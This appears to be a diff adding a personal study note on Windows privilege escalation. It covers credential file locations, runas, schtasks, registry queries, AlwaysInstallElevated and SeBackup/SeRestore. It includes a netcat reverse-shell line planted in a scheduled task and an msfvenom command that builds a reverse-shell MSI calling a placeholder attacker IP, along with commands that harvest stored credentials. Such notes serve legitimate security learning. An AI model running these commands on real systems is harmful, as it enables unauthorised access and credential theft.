@@ -1,0 +1,76 @@
+**Locations**
+**Unattended Windows Installations**
+When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
+
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+As part of these files, you might encounter credentials:
+
+**web.config**
+and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
+
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+Here is a quick way to **find database connection strings on the file**:
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+**Sys Commands** 
+
+**runas**
+**runas** -> An sys command letting as to exe command as other user 
+diffrence from sudo is that in runas we are really the user we executing, we executing it in their name but sudo we making the operation in their permission but it on our name 
+syntax:
+runas /user:[username] [command]
+runas /savecreds /user:admin [command] -> using saved password to run command as the selected user 
+
+**schtasks**
+schtasks /query [/tn <taskname>] [/fo format]  [/v ]-> info on Scheduled Task 
+{
+schtasks -> base command,manages Scheduled Tasks in Windows
+/query -> display query info about tasks
+/tn -> specify task name
+/fo -> format (-table {default},-list {detailed},-csv)
+-v -> verbose output
+in the place of query 
+/create
+/delete
+/run
+/end
+/change
+echo c:\tools\nc64.exe -e cmd.exe ATT_IP PORT > C:\tasks\schtasks.bat->**making a reverse shell in a task (:$)**
+}
+**icalcs** - managing permissions and access control 
+icalcs <"file/folder path">  [operation] [options]
+example: icalcs "C:\MyFolder" /grant user1:(R)
+{
+operations example
+/grant
+/deny
+/remove
+/save
+/restore
+/setowner
+}
+
+**reg query -Registry**
+ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s -> lthe query for registry queries looks for values related to putty 
+ **can expose ssh servers ips and usernames unusual ports if the user standing behind a proxy the attacker can take the config and use the proxy for himself use the config for making a queit attack tool  
+
+ **revshell**
+ msfvenom revshell =>
+ {
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+}
+**Permissions**
+ SeBackup - read protected files without regular perms
+ SeRestore  - write and change protected files without regular perms 
+ can help to attacker to take password hashes from the sam and system 
+ 
